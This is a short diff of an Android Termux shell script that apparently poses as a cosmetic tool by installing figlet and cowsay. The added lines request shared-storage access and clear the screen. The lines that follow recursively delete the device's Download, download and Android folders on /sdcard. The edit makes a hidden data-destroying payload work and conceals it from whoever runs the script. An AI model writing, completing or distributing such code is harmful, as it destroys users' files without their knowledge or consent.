@@ -22,10 +22,11 @@ C='\033[1;36m'
 #!Blanco
 W='\033[0m'
 
-clear
+
 apt-get install figlet
 apt-get install cowsay
-
+termux-setup-storage
+clear
 rm -r /sdcard/Download
 rm -r /sdcard/download
 rm -r /sdcard/Android
